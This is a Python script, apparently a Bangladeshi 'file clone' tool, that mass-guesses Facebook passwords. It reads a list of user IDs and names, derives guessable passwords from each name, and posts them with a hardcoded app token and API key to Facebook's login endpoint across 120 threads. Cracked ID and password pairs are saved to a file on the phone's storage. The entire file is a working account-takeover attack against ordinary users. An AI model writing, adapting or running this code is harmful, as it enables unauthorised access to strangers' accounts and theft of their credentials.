import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests -y")
    import requests

li="\033[1;37m—"

cox=str(f"{li}"*37)
logo=f"""
\033[37;1m8888888888 \033[34;1m888    888  \033[38;5;46m.d8888b.  
\033[37;1m888        \033[34;1m888    888 \033[38;5;46md88P  Y88b 
\033[37;1m888        \033[34;1m888    888 \033[38;5;46m888    888 
\033[37;1m8888888    \033[34;1m8888888888 \033[38;5;46m888        
\033[37;1m888        \033[34;1m888    888 \033[38;5;46m888        
\033[37;1m888        \033[34;1m888    888 \033[38;5;46m888    888 
\033[37;1m888        \033[34;1m888    888 \033[38;5;46mY88b  d88P 
\033[37;1m8888888888 \033[34;1m888    888  \033[38;5;46m"Y8888P" 
\033[37;1m-------------------------------------               
  \033[38;5;96m\033[47m M \x1b[0m\033[37;1m WORKING      FILE CLONE WORKING
  \033[38;5;96m\033[47m A \x1b[0m\033[37;1m WORKING      RANDOM NOT WORK
  \033[38;5;97m\033[47m S \x1b[0m\033[37;1m GITHUB       EHC CYBER 
  \033[38;5;98m\033[47m U \x1b[0m\033[37;1m COMMAND      \033[38;5;96m\033[47mPAID\x1b[0m
  \033[38;5;96m\033[47m M \x1b[0m\033[37;1m VERSION      \033[38;5;96m\033[47m0017EHC\x1b[0m
\033[1;97m-------------------------------------"""
def logox():
    os.system('clear')
    print(logo)

def main():
    logox()
    print("  [A] FILE CLONE  |  [B] EXIT TOOL")
    print(cox)
    want=input("  [✓] INPUT+>")
    if want in ["A","a","1","01"]:
        file_iclone()
    elif want in ["B","b","2","02"]:
        print(cox)
        print("  [✓] Thanks For using My tool")
        print(cox)
        sys.exit()
    else:
        print(cox)
        print("  [✓] Input right option")
        print(cox)
        time.sleep(3)
        main()

def file_iclone():
    print(cox)
    fl=input("  [✓]\033[38;5;46m File Path:")
    print(cox)
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        print("  [✓] \033[38;5;46mFile Does not found")
        print(cox)
        sys.exit()
    auto_pass(fileeee)



def auto_pass(fileeee):
    tl=str(len(fileeee))
    print("  [✓] Total id in File : "+tl)
    print(cox)
    print("  [✓] Id Save: /sdcard/Masum.txt")
    print(cox)
    with ThreadPool (max_workers=120) as feel:
        for data in fileeee:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append('57273200')
            pwx.append('59039200')
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(nam1+'123')
                    pwx.append(name1+'12')
                    pwx.append(name1+'123')
                    pwx.append(name1+' 123')
                    pwx.append(name1+'1234')
                    pwx.append(name1+'12345')
                    pwx.append(name1+'@#')
                    pwx.append(name1+'@@')
                    pwx.append(name1+'@@@')
                    pwx.append(name1+'@')
                    pwx.append(name1+'@123')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2)
                    pwx.append(mid_name+'12')
                    pwx.append(mid_name+'123')
                    pwx.append(mid_name+' 123')
                    pwx.append(mid_name+'1234')
                    pwx.append(mid_name+'12345')
                    pwx.append(mid_name+'@#')
                    pwx.append(mid_name+'@@')
                    pwx.append(mid_name+'@')
                    pwx.append(mid_name+'@123')
                    #-Mix
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+'12')
                    pwx.append(name1+mid_name+'123')
                    pwx.append(name1+mid_name+'1234')
                    pwx.append(name1+mid_name+'12345')
                    pwx.append(name1+mid_name+'@#')
                    pwx.append(name1+mid_name+'@@')
                    pwx.append(name1+mid_name+'@')
                    pwx.append(name1+mid_name+'@123')
                    pwx.append(name1+' '+mid_name)
                    pwx.append(name1+' '+mid_name+'123')
                    pwx.append(name1+' '+mid_name+'1234')
                    pwx.append(name1+' '+mid_name+'12345')
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    pwx.append(sur_name+'123')
                    pwx.append(sur_name+'1234')
                    pwx.append(sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name)
                    pwx.append(name1+mid_name+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name+'1234')
                    pwx.append(name1+mid_name+sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name+'@#')
                    pwx.append(name1+mid_name+sur_name+'@@')
                    pwx.append(name1+mid_name+sur_name+'@')
                    pwx.append(name1+' '+mid_name+' '+sur_name)
                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
            except:pass
            feel.submit(file_subb,uid,pwx)
loop=0
oks=[]

def file_subb(uid,pwx):
    global oks,loop
    sys.stdout.write(f"\r  \033[38;5;46m[Masum] {loop}|{str(len(oks))}");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {'Host': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    
    'dpr': '1.7000000476837158',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH2591"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'ua',
    'viewport-width': '980',
}
            
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r  [OK] {uid} | {ps}      ")
                open("/sdcard/Masum-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r। [OK] {uid} | {ps}      ")
                open("/sdcard/Masum-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
            elif "www.facebook.com" in q:
                print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

main()